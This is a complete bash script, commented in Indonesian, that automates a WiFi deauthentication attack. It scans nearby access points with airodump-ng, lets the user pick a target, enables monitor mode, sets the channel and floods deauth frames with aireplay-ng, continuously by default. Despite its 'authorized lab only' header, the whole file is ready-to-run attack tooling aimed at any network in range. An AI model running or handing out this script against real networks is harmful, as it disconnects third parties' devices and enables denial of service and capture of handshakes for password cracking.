#!/usr/bin/env bash
#
# wifi_deauth_flow.sh — Scan dengan airodump-ng, pilih target, lalu deauth (aireplay-ng)
#
# Authorization: Authorized security research / isolated lab only.
# Scope: Networks you own or have explicit written permission to test.
#
set -euo pipefail

usage() {
  cat <<'EOF'
Usage: sudo ./wifi_deauth_flow.sh <interface> [deauth_count]

  interface      Antarmuka nirkabel awal, contoh: wlan0
  deauth_count   Jumlah frame deauth per burst aireplay-ng (default: 0 = terus sampai Ctrl+C)

Alur:
  1) airodump-ng scan → pilih nomor jaringan
  2) hentikan airodump; airmon-ng stop <interface>
  3) airmon-ng start <interface>
  4) iwconfig <iface_monitor> channel <channel>
  5) aireplay-ng --deauth <N> -a <BSSID> <iface_monitor>

Contoh:
  sudo ./wifi_deauth_flow.sh wlan0
  sudo ./wifi_deauth_flow.sh wlan0 10
EOF
}

if [[ "${1:-}" == "-h" || "${1:-}" == "--help" ]]; then
  usage
  exit 0
fi

if [[ $EUID -ne 0 ]]; then
  echo "[!] Jalankan sebagai root (sudo)." >&2
  exit 1
fi

if [[ "$(uname -s)" != "Linux" ]]; then
  echo "[!] Peringatan: airmon-ng/aireplay-ng/iwconfig umumnya untuk Linux + driver mac80211." >&2
  echo "    Di macOS antarmuka ini biasanya tidak berjalan seperti di Kali/Parrot." >&2
fi

for bin in airodump-ng airmon-ng aireplay-ng iwconfig iw; do
  if ! command -v "$bin" >/dev/null 2>&1; then
    echo "[!] Perintah '$bin' tidak ditemukan. Pasang paket aircrack-ng / wireless-tools." >&2
    exit 1
  fi
done

IFACE="${1:-}"
if [[ -z "$IFACE" ]]; then
  usage >&2
  exit 1
fi

if ! ip link show "$IFACE" >/dev/null 2>&1; then
  echo "[!] Interface '$IFACE' tidak ada." >&2
  exit 1
fi

DEAUTH_COUNT="${2:-0}"

SCAN_DIR=""
CSV_FILE=""
AIRO_PID=""

cleanup_scan() {
  if [[ -n "${AIRO_PID:-}" ]] && kill -0 "$AIRO_PID" 2>/dev/null; then
    kill "$AIRO_PID" 2>/dev/null || true
    wait "$AIRO_PID" 2>/dev/null || true
  fi
}

trap cleanup_scan EXIT

echo "[*] Scan jaringan (airodump-ng) pada $IFACE — hentikan manual dengan Enter setelah cukup, atau tunggu timeout."
SCAN_DIR="$(mktemp -d /tmp/wifi_deauth_scan.XXXXXX)"
PREFIX="$SCAN_DIR/scan"

# Durasi scan otomatis (detik); ubah SCAN_SECONDS jika perlu
SCAN_SECONDS="${SCAN_SECONDS:-20}"

airodump-ng --write "$PREFIX" --output-format csv "$IFACE" >/dev/null 2>&1 &
AIRO_PID=$!

read -r -t "$SCAN_SECONDS" -p "[*] Tekan Enter untuk menghentikan scan lebih awal (timeout ${SCAN_SECONDS}s)... " _ || true
cleanup_scan
AIRO_PID=""

CSV_FILE="$(ls -1 "$PREFIX"*.csv 2>/dev/null | head -n1 || true)"
if [[ -z "$CSV_FILE" || ! -s "$CSV_FILE" ]]; then
  echo "[-] Tidak ada file CSV hasil scan. Coba antarmuka/driver lain atau aktifkan mode monitor dulu." >&2
  exit 1
fi

# Parse baris AP dari CSV airodump-ng (BSSID, channel, ESSID)
ROWS=()
while IFS= read -r line; do
  [[ -n "$line" ]] && ROWS+=("$line")
done < <(awk -F',' '
  /^[[:space:]]*$/ { next }
  /^BSSID/ { in_ap=1; next }
  /^Station MAC/ { in_ap=0; next }
  in_ap && $1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ {
    bssid=$1
    gsub(/^[[:space:]]+|[[:space:]]+$/, "", bssid)
    ch=$4
    gsub(/^[[:space:]]+|[[:space:]]+$/, "", ch)
    essid=$14
    gsub(/^[[:space:]]+|[[:space:]]+$/, "", essid)
    if (essid == "") essid="<hidden>"
    print bssid "|" ch "|" essid
  }
' "$CSV_FILE")

if [[ ${#ROWS[@]} -eq 0 ]]; then
  echo "[-] Tidak ada AP terdeteksi di CSV." >&2
  exit 1
fi

echo ""
echo "[+] Jaringan terdeteksi:"
i=1
for row in "${ROWS[@]}"; do
  IFS='|' read -r bssid ch essid <<<"$row"
  printf "  %2d) %-32s CH:%-3s %s\n" "$i" "$essid" "$ch" "$bssid"
  ((i++)) || true
done

echo ""
read -r -p "[?] Pilih nomor target: " choice
if ! [[ "$choice" =~ ^[0-9]+$ ]] || (( choice < 1 || choice > ${#ROWS[@]} )); then
  echo "[-] Pilihan tidak valid." >&2
  exit 1
fi

SEL="${ROWS[$((choice - 1))]}"
IFS='|' read -r TARGET_BSSID TARGET_CHANNEL TARGET_ESSID <<<"$SEL"

echo "[+] Target: $TARGET_ESSID | BSSID=$TARGET_BSSID | CH=$TARGET_CHANNEL"

echo "[*] airmon-ng stop $IFACE"
airmon-ng stop "$IFACE" >/dev/null 2>&1 || true
sleep 1

echo "[*] airmon-ng start $IFACE"
MON_IFACE=""
AIRMON_LOG="$(mktemp)"
if ! airmon-ng start "$IFACE" >"$AIRMON_LOG" 2>&1; then
  cat "$AIRMON_LOG" >&2
  echo "[-] airmon-ng start gagal." >&2
  rm -f "$AIRMON_LOG"
  exit 1
fi

# Coba ambil nama iface monitor dari keluaran airmon-ng (mac80211: ... on ... wlan0mon)
MON_IFACE="$(sed -n 's/.* on \[[^]]*\]\([A-Za-z0-9._-]*\).*/\1/p' "$AIRMON_LOG" | tail -n1)"
rm -f "$AIRMON_LOG"

if [[ -z "$MON_IFACE" ]]; then
  # Fallback: cari interface bertipe monitor
  while read -r line; do
    if [[ "$line" =~ Interface[[:space:]]+([^[:space:]]+) ]]; then
      cur="${BASH_REMATCH[1]}"
    elif [[ "$line" =~ type[[:space:]]+monitor ]]; then
      MON_IFACE="$cur"
    fi
  done < <(iw dev 2>/dev/null)
fi

if [[ -z "$MON_IFACE" || ! -d "/sys/class/net/$MON_IFACE" ]]; then
  echo "[-] Tidak bisa mendeteksi interface monitor. Periksa keluaran 'airmon-ng start' secara manual." >&2
  exit 1
fi

echo "[+] Interface monitor: $MON_IFACE"

echo "[*] iwconfig $MON_IFACE channel $TARGET_CHANNEL"
if ! iwconfig "$MON_IFACE" channel "$TARGET_CHANNEL" 2>/dev/null; then
  echo "[!] iwconfig set channel gagal, mencoba: iw dev $MON_IFACE set channel $TARGET_CHANNEL"
  iw dev "$MON_IFACE" set channel "$TARGET_CHANNEL"
fi

echo ""
if [[ "$DEAUTH_COUNT" == "0" ]]; then
  echo "[!] Deauth count=0 → aireplay-ng mengirim terus sampai Ctrl+C."
else
  echo "[*] Mengirim $DEAUTH_COUNT frame deauth per burst (aireplay-ng -0)."
fi
echo "[*] aireplay-ng --deauth $DEAUTH_COUNT -a $TARGET_BSSID $MON_IFACE"
echo ""

aireplay-ng --deauth "$DEAUTH_COUNT" -a "$TARGET_BSSID" "$MON_IFACE"

echo ""
echo "[*] Selesai. Membersihkan: airmon-ng stop $MON_IFACE ; airmon-ng stop $IFACE"
airmon-ng stop "$MON_IFACE" >/dev/null 2>&1 || true
airmon-ng stop "$IFACE" >/dev/null 2>&1 || true

rm -rf "$SCAN_DIR"
trap - EXIT
